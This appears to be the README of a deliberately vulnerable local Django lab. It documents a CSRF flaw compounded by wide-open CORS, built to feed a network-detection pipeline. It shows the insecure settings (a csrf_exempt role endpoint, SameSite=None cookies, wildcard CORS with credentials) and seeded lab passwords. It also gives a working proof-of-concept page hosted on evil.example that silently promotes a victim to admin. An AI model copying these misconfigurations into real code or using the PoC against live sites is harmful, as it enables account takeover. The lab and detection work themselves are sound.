# csrf-cors-misconfig

⚠️ **Intentionally vulnerable — local lab only.** This server is deliberately
broken so the repo's network capture / NCER causal-reconciliation pipeline
(`pkg/ncer`, Rust `omnisec-mitm`) has real traffic to detect. It binds to
`127.0.0.1` only and must never be exposed, reused, or deployed anywhere
else.

## Vulnerability: CWE-352 — Cross-Site Request Forgery, compounded by permissive CORS

The state-changing role-change endpoint, `POST /api/users/<id>/role`, is
decorated `@csrf_exempt` in `labapp/views.py`:

```python
# TEMP: exempted for the mobile app, TODO remove
@csrf_exempt
@json_login_required
@require_POST
def change_role_view(request, id):
    ...
```

That comment is the whole incident class in one line: someone disabled
Django's CSRF protection to unblock a client that couldn't (or wasn't
bothered to) send a CSRF token, on the single endpoint in this app that can
promote an account to `admin`, and the "TODO remove" never happened.

This is compounded by two more misconfigurations in the same project:

1. **Weak cookie flags** (`config/settings.py`):
   ```python
   CSRF_COOKIE_HTTPONLY = False
   SESSION_COOKIE_SAMESITE = None
   CSRF_COOKIE_SAMESITE = None
   ```
   `SESSION_COOKIE_SAMESITE = None` is what makes the victim's session
   cookie ride along on a cross-site request in the first place — that's
   the opposite of what `SameSite` is for.

2. **Wide-open CORS** (`labapp/middleware.py`, a small hand-rolled
   middleware used instead of pulling in `django-cors-headers`):
   ```python
   # INTENTIONALLY VULNERABLE: permissive CORS + credentials
   response["Access-Control-Allow-Origin"] = "*"
   response["Access-Control-Allow-Credentials"] = "true"
   ```
   This is the `CORS_ALLOW_ALL_ORIGINS = True` + `CORS_ALLOW_CREDENTIALS =
   True` equivalent, hand-rolled to keep `requirements.txt` minimal.

**Combined effect:** a page hosted on *any* origin can make an
authenticated cross-site request — using the victim's ambient session
cookie — straight to `POST /api/users/<id>/role`, with no CSRF token
required and no same-origin restriction from CORS. If the victim is a
normal logged-in user, this self-promotes *them* to admin. If the victim
happens to already be a logged-in admin, the same forged request can
retarget *any* account's role (see the authorization rule documented in
`change_role_view`'s docstring: a caller may always change their own role,
and an admin caller may change anyone's — a reasonable-looking rule that
CSRF completely routes around, because it never confirms the request was
actually intended by the account it's executing as).

## Endpoints

| Method | Path                          | Auth                                   |
|--------|-------------------------------|-----------------------------------------|
| POST   | `/login`                      | none (username + password in JSON body) |
| GET    | `/api/me`                     | session cookie                          |
| POST   | `/api/users/<id>/role`        | session cookie — **no CSRF check (bug)** |
| GET    | `/api/admin/dashboard`        | session cookie with `role=admin`        |

## Running

```sh
export DB_HOST=127.0.0.1
export DB_PORT=33306
export DB_NAME=labs_csrf_cors
export DB_USER=labs
export DB_PASSWORD=labs_lab_pw
export TRACKER_URL=http://127.0.0.1:18099/   # optional, points at labs/servers/trackercollector

pip install -r requirements.txt
python manage.py migrate
python manage.py runserver 127.0.0.1:18009
```

Schema: `labs/servers/db/mysql/init/09-csrf-cors-misconfig.sql` (just
creates the `labs_csrf_cors` database — Django's own migrations create the
tables and seed data). Seeded accounts (documented fake, local-lab-only
plaintext passwords, set via `set_password()` in
`labapp/migrations/0002_seed_users.py`):

| username     | password                | role      |
|--------------|-------------------------|-----------|
| `alice-user` | `alice-plaintext-pw123` | user      |
| `mod-morgan` | `morgan-plaintext-pw123`| moderator |
| `root-admin` | `admin-plaintext-pw123` | admin     |

## Exploit

### 1. Confirm the "legitimate" flow

```sh
curl -s -c cookies.txt -X POST http://127.0.0.1:18009/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice-user","password":"alice-plaintext-pw123"}'
# -> {"id":1,"username":"alice-user","role":"user"}

curl -s -b cookies.txt http://127.0.0.1:18009/api/me
# -> {"id":1,"username":"alice-user","role":"user"}
```

### 2. The forged cross-site request (what a malicious page does)

A page hosted on literally any other origin — it does **not** need to be
on `127.0.0.1` or `localhost`, and does **not** need to know or steal
alice's session cookie, only rely on her browser attaching it
automatically to a same-site-looking-but-isn't request:

```html
<!-- evil.html — served from ANY third-party origin, e.g. https://evil.example/ -->
<!doctype html>
<html>
  <body>
    <h1>Free prize inside, definitely not a CSRF PoC</h1>
    <script>
      fetch("http://127.0.0.1:18009/api/users/1/role", {
        method: "POST",
        credentials: "include", // send alice's ambient session cookie cross-site
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ role: "admin" }),
      });
      // No CSRF token, no same-origin requirement -- change_role_view's
      // @csrf_exempt plus this server's wide-open CORS response headers
      // (Access-Control-Allow-Origin: * / Access-Control-Allow-Credentials:
      // true) are what make this actually work end-to-end in a real
      // browser: the browser is willing to both SEND alice's cookie
      // cross-site (SESSION_COOKIE_SAMESITE=None) and treat the response
      // as CORS-permitted for a credentialed request (the wildcard +
      // credentials header pair).
    </script>
  </body>
</html>
```

If alice (still logged in, session cookie live in her browser) simply
visits a page containing that script — no click, no confirmation, nothing
that looks suspicious — her account is silently promoted to admin:

```sh
curl -s -b cookies.txt http://127.0.0.1:18009/api/me
# -> {"id":1,"username":"alice-user","role":"admin"}

curl -s -b cookies.txt http://127.0.0.1:18009/api/admin/dashboard
# -> 200 OK, full admin dashboard -- alice never asked for this
```

Server-side, this is logged loudly the moment it happens:

```
[CSRF/CORS PRIVESC USED] origin=https://evil.example caller=alice-user(id=1,role=user) target=alice-user(id=1) new_role=admin
```

and, if `TRACKER_URL` is set, a best-effort, non-blocking `POST` describing
the event (`{"event":"csrf_cors_privesc", ...}`) is fired at it — the same
beacon pattern used by other lab servers in this repo (sink:
`labs/servers/trackercollector`).

## What the ncer/mitm pipeline should flag

The network evidence this lab produces is a plaintext HTTP `POST` to
`/api/users/<id>/role` that:

- carries a foreign `Origin` header (anything other than
  `127.0.0.1`/`localhost` — a same-origin browser request never sets
  `Origin` on a simple navigation, and a genuinely same-site fetch would
  match this server's own origin),
- carries **no** `X-CSRFToken` header and **no** `csrfmiddlewaretoken`
  form field, yet still receives a `200 OK` with the role actually changed
  (rather than Django's usual `403 CSRF verification failed`), and
- whose response headers include the
  `Access-Control-Allow-Origin: *` / `Access-Control-Allow-Credentials:
  true` pair — the specific combination that made the browser willing to
  send the request with credentials from that foreign origin at all.

The pipeline should be able to capture the request/response pair via the
MITM interceptor, notice the missing CSRF validation on a privileged
state-changing endpoint, and flag the foreign-`Origin` + wide-open-CORS +
`csrf_exempt` combination as a CSRF/CORS-misconfiguration privilege
escalation (a live instance of the CWE-352 incident class).

## Docker

```sh
docker build -t labs-csrf-cors-misconfig .
```

`docker-compose` port mapping (host stays loopback-only):

```yaml
services:
  csrf-cors-misconfig:
    build: .
    ports:
      - "127.0.0.1:18009:18009"
    environment:
      DB_HOST: mysql
      DB_PORT: "3306"
      DB_NAME: labs_csrf_cors
      DB_USER: labs
      DB_PASSWORD: labs_lab_pw
```

## Tests

```sh
python manage.py test labapp
```

- `ChangeRoleCsrfExemptTest` is the key proof: a `Client(enforce_csrf_checks=True)`
  (i.e. one that behaves like a real CSRF-enforcing browser) successfully
  changes a role with **no** CSRF token sent at all, and a control request
  against Django's own admin login shows the same client/middleware would
  otherwise reject an unprotected POST with `403`. This test needs a real
  database.
- `PermissiveCorsHeaderTest` is a lighter check that
  `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials:
  true` appear together on responses — that header pairing is the actual
  browser-exploitable half of the misconfiguration.
